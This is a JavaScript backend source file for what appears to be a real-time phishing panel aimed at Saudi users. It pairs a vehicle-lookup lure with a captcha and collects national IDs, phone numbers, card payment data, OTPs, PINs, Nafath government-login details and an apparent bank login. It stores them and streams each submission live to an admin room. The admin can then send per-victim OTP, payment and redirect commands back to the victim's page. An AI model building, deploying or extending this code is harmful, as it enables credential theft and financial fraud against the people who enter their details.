/**
 * gosuksa backend — Railway-ready
 *
 * Implements the exact API contract the frontend bundle expects:
 *
 *  REST (called via same-origin /api-proxy/* from the Lovable frontend):
 *    GET  /                            -> health
 *    GET  /health                      -> { ok:true }
 *    GET  /breinit                     -> { ok:true }               (KSA gate stub)
 *    POST /api/user/init               -> { ok, _id, session, userInfo }
 *    POST /api/chat/enabled            -> { isChatEnabled: 0|1 }
 *    GET  /api/vicinfomain/captcha     -> { sessionId, captchaUuid, imageB64, imageDataUrl }
 *    POST /api/vicinfomain/createRequest
 *                                      -> { status, vehicle? , errorCode? }
 *    POST /api/store-policy            -> { ok:true }               (persist policy)
 *    POST /api/data/store-details      -> { ok:true }               (persist step data)
 *    POST /api/app-logs/:appId/log-user-in-app/:page -> { ok:true } (page-view beacon)
 *
 *  Socket.IO (path: /socket.io) — events emitted by the client:
 *    user:join, user:pageNavigation, user:typingStatus, user:statusUpdate,
 *    user:getChatHistory, admin:getChatHistory, admin:getUpdates,
 *    chat:message, booking:update, payment:update,
 *    otp:received, pin:received, nafath:submitted,
 *    phone:submitted, naflogin:submitted, nafotp:submitted, rajlogin:submitted,
 *    health:submitted, health2:submitted, health3:submitted, health4:submitted,
 *    client:cancelOtp, client:cancelPayment,
 *    payment:duplicateAttempt, otp:duplicateAttempt, bin:lookup
 *
 *  Events emitted TO clients:
 *    user:joined, user:uuidAssigned, csrf:token, site:publicSettings,
 *    chat:history, chat:message, live:update, live:updatesHistory,
 *    form:submitted (ack for booking), payment:action, otp:action,
 *    nafath:action, naflogin:action, phone:action, user:blocked,
 *    user:statusUpdate, user:typingStatus
 *
 * Storage: single JSON file (data.json). Swap for Mongo/Postgres later —
 * every write goes through the `db` helper.
 */

const express = require("express");
const http = require("http");
const cors = require("cors");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const { newCaptcha } = require("./captcha");
const { Server } = require("socket.io");

// ---------- config ----------
const PORT = process.env.PORT || 3000;
const DATA_FILE = process.env.DATA_FILE || path.join(__dirname, "data.json");
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "change-me";
const CHAT_ENABLED = process.env.CHAT_ENABLED === "0" ? 0 : 1;

// ---------- tiny JSON "db" ----------
const db = (() => {
  const empty = {
    users: {},         // uuid -> { uuid, createdAt, ip, ua, ... }
    submissions: [],   // { id, type, uuid, payload, ts }
    policies: [],      // stored policies from /api/store-policy
    details: [],       // stored motor step payloads
    chats: {},         // uuid -> [{ id, from, message, ts }]
    captchas: {},      // sessionId -> { captchaUuid, code, ts }
    blocked: {},       // uuid -> true
    logs: [],
  };
  let state = empty;
  try {
    if (fs.existsSync(DATA_FILE)) state = { ...empty, ...JSON.parse(fs.readFileSync(DATA_FILE, "utf8")) };
  } catch (e) { console.warn("db load failed:", e.message); }
  let dirty = false;
  setInterval(() => {
    if (!dirty) return;
    dirty = false;
    try { fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2)); }
    catch (e) { console.warn("db save failed:", e.message); }
  }, 1000);
  return {
    get: () => state,
    save: () => { dirty = true; },
    flush: () => { dirty = false; try { fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2)); } catch (e) { console.warn("db save failed:", e.message); } },
  };
})();

// ---------- app ----------
const app = express();
app.set("trust proxy", true);
app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: "5mb" }));
app.use(express.urlencoded({ extended: true, limit: "5mb" }));

const server = http.createServer(app);
const io = new Server(server, {
  path: "/socket.io",
  cors: { origin: true, credentials: true },
});

// ---------- helpers ----------
const now = () => new Date().toISOString();
const STARTED_AT = new Date().toISOString();
const uuid = () => crypto.randomUUID();

function clientIp(req) {
  return (
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.toString().split(",")[0].trim() ||
    req.socket?.remoteAddress ||
    "Unknown"
  );
}

function requireAdmin(req, res, next) {
  const t = req.headers.authorization?.replace(/^Bearer\s+/i, "") || req.query.token;
  if (t !== ADMIN_TOKEN) return res.status(401).json({ error: "unauthorized" });
  next();
}

// ---------- REST routes ----------
app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
app.get("/health", (_req, res) => res.json({ ok: true }));

// Deployment fingerprint — lets us confirm which build Railway is running.
const APP_VERSION = "v5";
app.get("/version", (_req, res) =>
  res.json({
    version: APP_VERSION,
    dataFile: DATA_FILE,
    persistent: DATA_FILE.startsWith("/data"),
    vicUpstream: !!process.env.VIC_UPSTREAM_URL,
    submissions: db.get().submissions.length,
    startedAt: STARTED_AT,
  })
);


// KSA/geo gate stub — frontend calls this on boot
app.get("/breinit", (_req, res) => res.json({ ok: true }));

// User init — frontend requires userInfo.uuid or it stalls
app.post("/api/user/init", (req, res) => {
  const { uuid: sentUuid, browserInfo } = req.body || {};
  const id = sentUuid || uuid();
  const ip = clientIp(req);
  const state = db.get();
  state.users[id] = {
    ...(state.users[id] || {}),
    uuid: id,
    ip,
    ua: req.headers["user-agent"] || "",
    browserInfo: browserInfo || null,
    lastSeen: now(),
    createdAt: state.users[id]?.createdAt || now(),
  };
  db.save();
  res.json({
    ok: true,
    _id: id,
    session: crypto.randomBytes(16).toString("hex"),
    userInfo: {
      uuid: id,
      visitTime: now(),
      ip,
      country: "Unknown",
      countryCode: "XX",
    },
  });
});

app.post("/api/chat/enabled", (_req, res) => res.json({ isChatEnabled: CHAT_ENABLED }));

// ---------- Vehicle Info Main (VIC) captcha + lookup ----------
// The captcha image is generated here (real, readable PNG) and validated on
// createRequest. The vehicle lookup is forwarded to the real provider when
// VIC_UPSTREAM_URL is set; otherwise the request is recorded as
// vehicle_not_found. No mock data is ever returned.
app.get("/api/vicinfomain/captcha", (_req, res) => {
  const sessionId = uuid();
  const captchaUuid = uuid();
  const { code, imageB64 } = newCaptcha();
  const state = db.get();
  state.captchas[sessionId] = { captchaUuid, code, ts: Date.now() };
  db.save();
  res.json({
    sessionId,
    captchaUuid,
    imageB64,
    imageDataUrl: `data:image/png;base64,${imageB64}`,
  });
});

app.post("/api/vicinfomain/createRequest", async (req, res) => {
  const body = req.body || {};
  const {
    jcaptcha,
    captchaUuid,
    vicinfomainSessionId,
    sequenceNumber,
    identityNumber,
    nationalId,
    mobileNumber,
    uuid: userUuid,
  } = body;
  const state = db.get();
  const c = state.captchas[vicinfomainSessionId];

  const baseSubmission = {
    identityNumber: identityNumber || nationalId || null,
    mobileNumber: mobileNumber || null,
    sequenceNumber: sequenceNumber || null,
    uuid: userUuid || null,
    ip: clientIp(req),
    raw: body,
  };

  if (!c || c.captchaUuid !== captchaUuid) {
    recordSubmission("vehicleRequest", { ...baseSubmission, result: "invalid_captcha" });
    return res.json({ status: "invalid_captcha", errorCode: "invalid_captcha" });
  }
  if (String(jcaptcha).trim() !== c.code) {
    recordSubmission("vehicleRequest", { ...baseSubmission, result: "invalid_captcha" });
    return res.json({ status: "invalid_captcha", errorCode: "invalid_captcha" });
  }
  delete state.captchas[vicinfomainSessionId];
  db.save();

  // Real VIC lookup: forwarded to the upstream provider when configured.
  if (process.env.VIC_UPSTREAM_URL) {
    try {
      const r = await fetch(process.env.VIC_UPSTREAM_URL, {
        method: "POST",
        headers: {
          "content-type": "application/json",
          ...(process.env.VIC_UPSTREAM_TOKEN
            ? { authorization: `Bearer ${process.env.VIC_UPSTREAM_TOKEN}` }
            : {}),
        },
        body: JSON.stringify({ sequenceNumber, identityNumber: baseSubmission.identityNumber }),
      });
      const data = await r.json().catch(() => null);
      const vehicle = data?.vehicle || (data && data.vehicleMaker ? data : null);
      if (r.ok && vehicle) {
        recordSubmission("vehicleRequest", { ...baseSubmission, result: "success", vehicle });
        return res.json({ status: "success", vehicle });
      }
    } catch (e) {
      console.warn("[vic] upstream lookup failed:", e.message);
    }
  }
  recordSubmission("vehicleRequest", { ...baseSubmission, result: "vehicle_not_found" });
  return res.json({ status: "vehicle_not_found", errorCode: "vehicle_not_found" });
});

// Policy / step details persistence
app.post("/api/store-policy", (req, res) => {
  const state = db.get();
  const entry = { id: uuid(), ts: now(), ip: clientIp(req), ...req.body };
  state.policies.push(entry);
  db.save();
  recordSubmission("policy", entry);
  res.json({ ok: true });
});
app.post("/api/data/store-details", (req, res) => {
  const state = db.get();
  const entry = { id: uuid(), ts: now(), ip: clientIp(req), ...req.body };
  state.details.push(entry);
  db.save();
  recordSubmission("details", entry);
  res.json({ ok: true });
});

// Frontend page-view beacon
app.post("/api/app-logs/:appId/log-user-in-app/:page", (req, res) => {
  const state = db.get();
  state.logs.push({ ts: now(), appId: req.params.appId, page: req.params.page, ip: clientIp(req) });
  if (state.logs.length > 5000) state.logs.splice(0, state.logs.length - 5000);
  db.save();
  res.json({ ok: true });
});

// ---------- Admin read APIs (Bearer ADMIN_TOKEN) ----------
app.get("/admin/state", requireAdmin, (_req, res) => res.json(db.get()));
app.get("/admin/submissions", requireAdmin, (_req, res) => res.json(db.get().submissions));
app.get("/admin/users", requireAdmin, (_req, res) => res.json(db.get().users));

// ---------- Socket.IO ----------
function recordSubmission(type, payload) {
  const state = db.get();
  const entry = { id: uuid(), type, uuid: payload?.uuid || payload?.userId || null, ts: now(), payload };
  state.submissions.push(entry);
  db.flush();
  console.log(`[submission] ${type} ${entry.payload?.result || ""} total=${state.submissions.length}`);
  io.to("admins").emit("live:update", entry);
  return entry;
}

io.on("connection", (socket) => {
  console.log(`[io] connected ${socket.id}`);

  // CSRF stub — the client refuses to submit booking until it has a token
  const csrf = crypto.randomBytes(24).toString("hex");
  socket.emit("csrf:token", { token: csrf });
  socket.emit("site:publicSettings", { chatEnabled: !!CHAT_ENABLED });
  socket.data.csrf = csrf;

  socket.on("user:join", (p = {}) => {
    const userType = p.userType || "client";
    const uid = p.userId || p.userInfo?.uuid || uuid();
    socket.data.userType = userType;
    socket.data.userId = uid;

    if (userType === "admin") {
      if (p.userInfo?.adminToken && p.userInfo.adminToken !== ADMIN_TOKEN) {
        socket.emit("user:blocked", { reason: "invalid_admin_token" });
        socket.disconnect(true);
        return;
      }
      socket.join("admins");
      socket.emit("user:joined", { userId: uid });
      // Send existing submissions as history
      socket.emit("live:updatesHistory", db.get().submissions.slice(-200));
      return;
    }

    // client
    if (db.get().blocked[uid]) {
      socket.emit("user:blocked", { reason: "blocked" });
      return;
    }
    socket.join(`user:${uid}`);
    socket.emit("user:joined", { userId: uid });
    socket.emit("user:uuidAssigned", { uuid: uid });
  });

  // Chat
  socket.on("chat:message", (msg, ack) => {
    const uid = socket.data.userId;
    if (!uid) return ack && ack({ ok: false, error: "no_user" });
    const state = db.get();
    const list = (state.chats[uid] ||= []);
    const entry = { id: uuid(), from: socket.data.userType || "client", message: msg?.message || "", ts: now() };
    list.push(entry);
    db.save();
    io.to(`user:${uid}`).emit("chat:message", { ...entry, userType: entry.from, targetUserId: uid });
    io.to("admins").emit("chat:message", { ...entry, userType: entry.from, targetUserId: uid });
    ack && ack({ ok: true, id: entry.id });
  });

  socket.on("user:getChatHistory", () => {
    const uid = socket.data.userId;
    socket.emit("chat:history", db.get().chats[uid] || []);
  });
  socket.on("admin:getChatHistory", (p = {}) => {
    const uid = p.userId || p.uuid;
    socket.emit("chat:history", uid ? db.get().chats[uid] || [] : db.get().chats);
  });
  socket.on("admin:getUpdates", () => {
    socket.emit("live:updatesHistory", db.get().submissions.slice(-200));
  });

  // Booking flow — must ack with { formType:"booking", success:true }
  socket.on("booking:update", (payload = {}, ack) => {
    recordSubmission("booking", payload);
    const res = { formType: "booking", success: true };
    io.to("admins").emit("form:submitted", res);
    socket.emit("form:submitted", res);
    ack && ack(res);
  });

  // Every other client -> server event: persist + forward to admins
  const passthrough = [
    "payment:update",
    "otp:received",
    "pin:received",
    "nafath:submitted",
    "phone:submitted",
    "naflogin:submitted",
    "nafotp:submitted",
    "rajlogin:submitted",
    "health:submitted",
    "health2:submitted",
    "health3:submitted",
    "health4:submitted",
    "client:cancelOtp",
    "client:cancelPayment",
    "payment:duplicateAttempt",
    "otp:duplicateAttempt",
  ];
  for (const ev of passthrough) {
    socket.on(ev, (payload = {}) => {
      recordSubmission(ev, payload);
    });
  }

  // BIN lookup — client passes { bin } and expects ack({ ok, meta:{ brand, scheme, ...} })
  socket.on("bin:lookup", ({ bin } = {}, ack) => {
    if (!ack) return;
    // Stub — swap for a real BIN provider (binlist, etc.)
    ack({ ok: true, meta: { brand: "unknown", scheme: "unknown", bin } });
  });

  // Presence / typing
  socket.on("user:pageNavigation", (p) => io.to("admins").emit("live:update", { type: "pageNavigation", uuid: socket.data.userId, page: p?.page, ts: now() }));
  socket.on("user:typingStatus", (p) => io.to("admins").emit("user:typingStatus", { uuid: socket.data.userId, ...p }));
  socket.on("user:statusUpdate", (p) => io.to("admins").emit("user:statusUpdate", { uuid: socket.data.userId, ...p }));

  // Admin -> client actions
  const adminEvents = ["payment:action", "otp:action", "nafath:action", "naflogin:action", "phone:action", "admin:redirect"];
  for (const ev of adminEvents) {
    socket.on(ev, (p = {}) => {
      if (socket.data.userType !== "admin") return;
      const target = p.userId || p.uuid;
      if (target) io.to(`user:${target}`).emit(ev, p);
    });
  }

  socket.on("disconnect", (reason) => console.log(`[io] disconnect ${socket.id} ${reason}`));
});

// ---------- start ----------
server.listen(PORT, () => {
  console.log(`gosuksa backend listening on :${PORT}`);
  console.log(`data file: ${DATA_FILE}`);
});
